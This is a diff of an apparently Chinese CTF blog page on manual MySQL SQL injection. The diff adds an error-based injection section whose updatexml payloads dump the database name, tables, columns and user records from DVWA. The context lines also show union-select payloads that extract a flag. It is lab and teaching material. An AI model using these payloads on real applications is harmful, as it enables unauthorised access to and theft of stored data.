@@ -17,7 +17,7 @@
 <meta property="og:description" content="手注流程 页面里有一个POST表单，测试会不会有注入漏洞 POST里 id&#x3D;1’和id&#x3D;1’# id&#x3D;1’ and 1&#x3D;2#和id&#x3D;1’ and 1&#x3D;1# 前一个不回显后一个回显，那么说明存在注入。  判断字段数：有四个字段 id&#x3D;1’ order by 4#  判断回显位： id&#x3D;1’ union select 1,2,3,4# 有正常回显 id&#x3D;1’ union select 1,2,3# 无">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2021-04-25T09:12:07.000Z">
-<meta property="article:modified_time" content="2021-06-18T06:04:54.784Z">
+<meta property="article:modified_time" content="2021-07-05T09:38:51.707Z">
 <meta property="article:author" content="Tsunamori">
 <meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary">
@@ -511,7 +511,7 @@
             
                 <div id="toc" class="toc-article">
                 <strong class="toc-title">Catalogue</strong>
-                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E6%B3%A8%E6%B5%81%E7%A8%8B"><span class="toc-number">1.</span> <span class="toc-text">手注流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E5%90%84%E7%A7%8D%E9%97%AE%E9%A2%98%E5%A4%84%E7%90%86%E6%96%B9%E6%B3%95"><span class="toc-number">2.</span> <span class="toc-text">注入各种问题处理方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E5%AE%83%E8%B5%84%E6%BA%90"><span class="toc-number">3.</span> <span class="toc-text">其它资源</span></a></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E6%B3%A8%E6%B5%81%E7%A8%8B"><span class="toc-number">1.</span> <span class="toc-text">手注流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E6%B3%A8%E5%8F%98%E7%A7%8D%EF%BC%9A%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">手注变种：报错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E5%90%84%E7%A7%8D%E9%97%AE%E9%A2%98%E5%A4%84%E7%90%86%E6%96%B9%E6%B3%95"><span class="toc-number">3.</span> <span class="toc-text">注入各种问题处理方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E5%AE%83%E8%B5%84%E6%BA%90"><span class="toc-number">4.</span> <span class="toc-text">其它资源</span></a></li></ol>
                 </div>
             
         
@@ -531,6 +531,13 @@
 </li>
 <li><p>查询数据：<br> id=0’ union select 1,2,3,skctf_flag from fl4g#<br> 得到flag。</p>
 </li>
+</ol>
+<h3 id="手注变种：报错注入"><a href="#手注变种：报错注入" class="headerlink" title="手注变种：报错注入"></a>手注变种：报错注入</h3><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cnblogs.com/c1047509362/p/12806297.html">https://www.cnblogs.com/c1047509362/p/12806297.html</a></p>
+<ol>
+<li><code>1&#39;or(updatexml(1,concat(0x7e,database(),0x7e,user(),0x7e,@@datadir),1))=&#39;1</code> 爆出数据库</li>
+<li><code>1&#39;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))，0x7e),1))=&#39;1</code> 爆当前数据库表信息</li>
+<li><code>1&#39;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_schema=wp_links)and(table_name=&#39;users&#39;)),0x7e),1))=&#39;1</code> 爆user表字段信息</li>
+<li><code>1&#39; and updatexml(1,concat(0x7e,(select group_concat(first_name,0x7e,last_name) from dvwa.users)),1) #</code> 爆数据库内容</li>
 </ol>
 <h3 id="注入各种问题处理方法"><a href="#注入各种问题处理方法" class="headerlink" title="注入各种问题处理方法"></a>注入各种问题处理方法</h3><ol>
 <li>提示输出信息超过一行：使用group_concat,eg:3’or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=’test’)),0x7e),1))=’1</li>
